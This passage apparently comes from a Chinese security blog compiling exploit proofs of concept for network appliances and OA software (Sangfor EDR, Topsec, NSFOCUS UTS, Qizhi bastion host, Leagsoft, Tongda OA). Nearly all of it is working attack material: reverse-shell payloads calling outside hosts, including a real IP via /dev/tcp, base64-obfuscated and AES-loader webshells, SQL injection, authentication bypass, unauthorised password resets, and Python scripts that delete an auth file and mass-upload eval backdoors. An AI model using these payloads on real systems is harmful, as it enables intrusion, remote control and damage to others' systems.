192.168.226.60</span><br><span class="line"><span class="attribute">Connection</span>: close </span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0  </span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0； Win64； x64) AppleWebKit/537.36 (KHTML， like Gecko) Chrome/85.0.4183.83Safari/537.36 </span><br><span class="line"><span class="attribute">Accept</span>: text/html, application/xhtml+xml, application/xml；q=0.9, image/avif,image/webp, image/apng，*/*;q=0.8,application/sign ed-exchange；v=b3；q=0.9 </span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">HTTP_Y_FORWARDED_FOR</span>: 192.168.226.1</span><br><span class="line"><span class="attribute">Content-Length</span>: 76 </span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">HTTP_Y_FORWARDED_FOR</span>: 192.168.226.1</span><br><span class="line"></span><br><span class="line">&#123;"params":"w=123\"'1234123'\"|bash -i &gt; /dev/tcp/167.179.118.219/8899 0&gt;&amp;1”&#125;</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnblogs.com/0day-li/p/13650452.html" target="_blank" rel="noopener">https://www.cnblogs.com/0day-li/p/13650452.html</a></p>
<h4 id="6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552"><a href="#6、深信服-EDR-任意用户登录漏洞-CNVD-2020-46552" class="headerlink" title="6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552"></a>6、深信服 EDR 任意用户登录漏洞 CNVD-2020-46552</h4><p><strong>影响版本：</strong>EDR &lt;= v3.2.19</p>
<figure class="highlight plain"><figcaption><span>POC</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload：https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;任意用户名</span><br><span class="line">https:&#x2F;&#x2F;ip:xx&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure>

<h4 id="7、深信服-EDR-远程命令执行漏洞"><a href="#7、深信服-EDR-远程命令执行漏洞" class="headerlink" title="7、深信服 EDR 远程命令执行漏洞"></a>7、深信服 EDR 远程命令执行漏洞</h4><p><strong>影响版本：</strong>深信服EDR 3.2.16；深信服EDR 3.2.17；深信服EDR 3.2.19</p>
<figure class="highlight"><figcaption><span>EXP</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POC：</span></span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;limit=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;host=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;path=whoami</span><br><span class="line">https://XXX/tool/log/c.php?strip_slashes=system&amp;row=whoami</span><br><span class="line"></span><br><span class="line">反弹Shell:</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/tool/log/c.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=b1464478cad68327229d8f46e60d0a08; _ga=GA1.4.112365795.1597799903; _gid=GA1.4.1225783590.1597799903</span><br><span class="line"><span class="attribute">Content-Length</span>: 256</span><br><span class="line"></span><br><span class="line">strip_slashes=system&amp;host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>

<h4 id="8、绿盟UTS综合威胁探针管理员任意登录-密码泄露"><a href="#8、绿盟UTS综合威胁探针管理员任意登录-密码泄露" class="headerlink" title="8、绿盟UTS综合威胁探针管理员任意登录/密码泄露"></a>8、绿盟UTS综合威胁探针管理员任意登录/密码泄露</h4><p><strong>影响版本：</strong>UTS &lt; V2.0R00F02SP03</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POC步骤：</span><br><span class="line">访问页面，随意输入用户名admin密码XXX，获取响应</span><br><span class="line">将相应的stauts字段false改为true可获取admin的md5值password</span><br><span class="line">利用md5作为password字段修改最初的包再去登录</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnblogs.com/0day-li/p/13650550.html" target="_blank" rel="noopener">https://www.cnblogs.com/0day-li/p/13650550.html</a></p>
<h4 id="9、天融信TOPApp-LB负载均衡SQL注入漏洞"><a href="#9、天融信TOPApp-LB负载均衡SQL注入漏洞" class="headerlink" title="9、天融信TOPApp-LB负载均衡SQL注入漏洞"></a>9、天融信TOPApp-LB负载均衡SQL注入漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/acc/clsf/report/datasource.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host:xxxx.com</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*</span><br><span class="line"><span class="attribute">X-Prototype-Version</span>: 1.6.0.3</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: empty</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 201</span><br><span class="line"></span><br><span class="line">t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=</span><br></pre></td></tr></table></figure>

<h4 id="10、天融信数据防泄漏系统未授权修改管理员密码"><a href="#10、天融信数据防泄漏系统未授权修改管理员密码" class="headerlink" title="10、天融信数据防泄漏系统未授权修改管理员密码"></a>10、天融信数据防泄漏系统未授权修改管理员密码</h4><p><strong>描述：</strong></p>
<p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd。接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /?module=auth_user&amp;action=mod_edit_pwd http/1.1</span><br><span class="line"><span class="attribute">Cookie</span>: username=superman;</span><br><span class="line"></span><br><span class="line">uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.secpulse.com/archives/140809.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/140809.html</a></p>
<p>其它漏洞：<a href="https://blog.csdn.net/Adminxe/article/details/108744908" target="_blank" rel="noopener">https://blog.csdn.net/Adminxe/article/details/108744908</a></p>
<h4 id="11、网御星云VPN老版本漏洞"><a href="#11、网御星云VPN老版本漏洞" class="headerlink" title="11、网御星云VPN老版本漏洞"></a>11、网御星云VPN老版本漏洞</h4><h4 id="12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835"><a href="#12、齐治堡垒机前台远程命令执行漏洞-CVND-2019-20835" class="headerlink" title="12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835"></a>12、齐治堡垒机前台远程命令执行漏洞 CVND-2019-20835</h4><p><strong>漏洞利用：</strong>fofa_dork: ‘body=”齐治科技”‘，一般通过VPN访问，互联网不能直接访问<br><strong>利用条件：</strong>无需登录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">假设10.20.10.11为黑客可控的服务器，listener&#x2F;cluster_manage.php文件的内容为“&lt;?php echo ‘OK’;&gt;”</span><br><span class="line">1、访问 http:&#x2F;&#x2F;10.20.10.11&#x2F;listener&#x2F;cluster_manage.php  :返回 &quot;OK&quot;.</span><br><span class="line">2、访问如下链接即可getshell，执行成功后，生成PHP一句话马（echo &#39;&lt;?php @eval($_REQUEST[10086]);?&gt;&#39;&gt;&gt;&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php）</span><br><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br><span class="line">3、&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php  密码10086</span><br><span class="line"></span><br><span class="line">备注：ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK就是echo &#39;&lt;?php @eval($_REQUEST[10086]);?&gt;&#39;&gt;&gt;&#x2F;var&#x2F;www&#x2F;shterm&#x2F;resources&#x2F;qrcode&#x2F;lbj77.php的base64加密后的结果</span><br><span class="line"></span><br><span class="line">据说还是另外一个版本是java的。</span><br><span class="line">POST &#x2F;shterm&#x2F;listener&#x2F;tui_update.php</span><br><span class="line"></span><br><span class="line">a&#x3D;[&quot;t&#39;;import os;os.popen(&#39;whoami&#39;)#&quot;]</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.secpulse.com/archives/140809.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/140809.html</a></p>
<p>齐治堡垒机命令执行CVE-2019-17294</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min=40&amp;server_cond=&amp;service=`id`&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ip</span><br><span class="line"><span class="attribute">Reterer</span>: https：//10/ /audit/browse.php?year=2019&amp;month=04&amp;day=02&amp;hour=096mi|nute=40&amp;service=tui </span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">X-Requested-With:XMLHttpRequest</span></span><br><span class="line"><span class="attribute">DNT:1</span></span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">page=l&amp;rp=30&amp;sortname=stampl&amp;sortorder=desc&amp;query=&amp;qtype=</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">200</span> OK </span><br><span class="line"><span class="attribute">Date</span>: Tue, 02 Apr 2019 02:00:57 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span>: text/x-json</span><br><span class="line"></span><br><span class="line">("cmdline": "/usr/libexec/shterm/auditlist all sess -fjson--pagesize=3 --page=l --tl=2019-04-02 09:40:00--t2=2019-04-02019:41:00--locale=zh CN --order=-Stampl    --service=uid=48(apache) gid=48(apache) groups=48(apache) --domains 16"， "page": l， "total": 0，titles:tid"/status"，"proto，"stampi"，"stamp2"，  "from_1 paddr"， "identity_ login"，|"server_name"， Igierver_ip"， "account_remote"， "count_cmd"，  " COulint_cmd_deny"， "count_cmd_kill"， "optime"， "filesi.ze"， "reviewer"]， "rows" : [] )</span><br></pre></td></tr></table></figure>

<h4 id="13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115"><a href="#13、Aruba-Clearpass远程代码执行漏洞-CVE-2020-7115" class="headerlink" title="13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115"></a>13、Aruba Clearpass远程代码执行漏洞 CVE-2020-7115</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;portswigger.net&#x2F;daily-swig&#x2F;critical-aruba-clearpass-rce-vulnerability-exposes-underlying-systems</span><br></pre></td></tr></table></figure>

<h4 id="14、PAN-OS远程代码执行漏洞-CVE-2020-2040"><a href="#14、PAN-OS远程代码执行漏洞-CVE-2020-2040" class="headerlink" title="14、PAN-OS远程代码执行漏洞 CVE-2020-2040"></a>14、PAN-OS远程代码执行漏洞 CVE-2020-2040</h4><h4 id="15、联软准入文件上传漏洞"><a href="#15、联软准入文件上传漏洞" class="headerlink" title="15、联软准入文件上传漏洞"></a>15、联软准入文件上传漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/uai/download/uploadfileToPath.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: xxxxx</span><br><span class="line">... ...</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="input_localfile"; filename="xxx.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/png</span><br><span class="line"> </span><br><span class="line">&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals("POST"))&#123;String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br><span class="line"> </span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploadpath"</span><br><span class="line"> </span><br><span class="line">../webapps/notifymsg/devreport/</span><br><span class="line">-----------------------------570xxxxxxxxx6025274xxxxxxxx1--</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://blog.csdn.net/m0_48520508/article/details/108790281" target="_blank" rel="noopener">https://blog.csdn.net/m0_48520508/article/details/108790281</a></p>
<h2 id="二、OA"><a href="#二、OA" class="headerlink" title="二、OA"></a>二、OA</h2><h4 id="1、通达OA11-6未授权远程代码执行漏洞"><a href="#1、通达OA11-6未授权远程代码执行漏洞" class="headerlink" title="1、通达OA11.6未授权远程代码执行漏洞"></a>1、通达OA11.6未授权远程代码执行漏洞</h4><p><strong>描述：</strong>该漏洞是由于通过删除通达OA身份认证文件达到绕过登录限制, 结合任意文件上传达到RCE的效果。<br><strong>影响版本</strong>：通达OA&lt;v11.5&amp;v11.6版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">version = sys.version_info</span><br><span class="line"><span class="keyword">if</span> version &lt; (<span class="number">3</span>, <span class="number">0</span>):</span><br><span class="line">    print(<span class="string">'The current version is not supported, you need to use python3'</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target=target</span><br><span class="line">        payload=<span class="string">'&lt;?php eval($_POST["admin"]);?&gt;'</span><span class="comment">#可自行修改</span></span><br><span class="line">        print(target,<span class="string">"[*]删除auth.inc.php..."</span>)</span><br><span class="line"> </span><br><span class="line">        url=target+<span class="string">"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"</span><span class="comment">#删除auth.inc.php请求</span></span><br><span class="line">        requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        print(target,<span class="string">"[*]正在检查文件是否已删除..."</span>)</span><br><span class="line">        url=target+<span class="string">"/inc/auth.inc.php"</span></span><br><span class="line">        page=requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="comment">#print(page)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">            print(target,<span class="string">"[-]无法删除auth.inc.php文件"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        print(target,<span class="string">"[+]删除auth.inc.php成功"</span>)</span><br><span class="line">        print(target,<span class="string">"[*]开始上传payload..."</span>)</span><br><span class="line">        url=target+<span class="string">"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"</span></span><br><span class="line">        files = &#123;<span class="string">'FILE1'</span>: (<span class="string">'admin1.php'</span>, payload)&#125;</span><br><span class="line">        requests.post(url=url,files=files,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        url=target+<span class="string">"/_admin1.php"</span></span><br><span class="line">        page=requests.get(url=url,verify=<span class="literal">False</span>,timeout=<span class="number">10</span>).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">            print(<span class="string">"[+]************************文件已存在，上传成功************************"</span>)</span><br><span class="line">           <span class="comment"># if '8a8127bc83b94ad01414a7a3ea4b8' in page:#如果执行过md5函数，才确认漏洞存在，减少误报</span></span><br><span class="line">            print(target,<span class="string">"************************代码执行成功，存在漏洞************************"</span>)</span><br><span class="line">            print(target,<span class="string">"[+]URL:"</span>,url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(target,<span class="string">"[-]文件上传失败"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(target,e)</span><br><span class="line">urls=<span class="string">'url.txt'</span></span><br><span class="line">print(<span class="string">"[*]警告：利用此漏洞，会删除auth.inc.php，这可能会损坏OA系统"</span>)</span><br><span class="line">input(<span class="string">"按Enter继续"</span>)</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> open(urls,<span class="string">'r'</span>,encoding=<span class="string">'utf-8'</span>).read().split(<span class="string">'\n'</span>):</span><br><span class="line">    url=url.split()</span><br><span class="line">    exploit(url[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong>：<a href="https://www.cnblogs.com/wangfuguiblog/p/13712433.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangfuguiblog/p/13712433.html</a></p>
<h4 id="2、通达OA11-4-越权登录漏洞"><a href="#2、通达OA11-4-越权登录漏洞" class="headerlink" title="2、通达OA11.4 越权登录漏洞"></a>2、通达OA11.4 越权登录漏洞</h4><p>备注：4.17老漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment"># 11.X: /general/login_code.php , /logincheck_code.php , /general/index.php?isIE=0</span></span><br><span class="line">    <span class="comment"># 2017: /ispirit/login_code.php ,</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'</span>&#125;</span><br><span class="line">    checkUrl = url + <span class="string">'/general/login_code.php'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(checkUrl)</span><br><span class="line">        resText = str(res.text).split(<span class="string">'&#123;'</span>)</span><br><span class="line">        codeUid = resText[<span class="number">-1</span>].replace(<span class="string">'&#125;"&#125;'</span>, <span class="string">''</span>).replace(<span class="string">'\r\n'</span>, <span class="string">''</span>)</span><br><span class="line">        getSessUrl = url + <span class="string">'/logincheck_code.php'</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">'CODEUID'</span>: <span class="string">'&#123;'</span> + codeUid + <span class="string">'&#125;'</span>, <span class="string">'UID'</span>: int(<span class="number">1</span>)&#125;, headers=headers)</span><br><span class="line">        print(<span class="string">'[+]Get Available COOKIE:'</span> + res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        headers[<span class="string">"Cookie"</span>] = str(res.headers[<span class="string">'Set-Cookie'</span>])</span><br><span class="line">        loginUrl = self.url + <span class="string">'/general/index.php?isIE=0'</span></span><br><span class="line">        rsp = requests.get(loginUrl, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"管理员"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"admin"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">            print(<span class="string">'seccuss！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="3、通达OA11-5-多处SQL注入漏洞"><a href="#3、通达OA11-5-多处SQL注入漏洞" class="headerlink" title="3、通达OA11.5 多处SQL注入漏洞"></a>3、通达OA11.5 多处SQL注入漏洞</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/general/appbuilder/web/calendar/calendarlist/getcallist</span> HTTP/1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span>: https://www.0-sec.org/portal/home/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Host</span>: www.0-sec.org</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span>: 154</span><br><span class="line"><span class="attribute">X-WVS-ID</span>: Acunetix-Autologin/65535</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Origin</span>: https://www.0-sec.org</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"></span><br><span class="line">starttime=AND (SELECT [RANDNUM] FROM 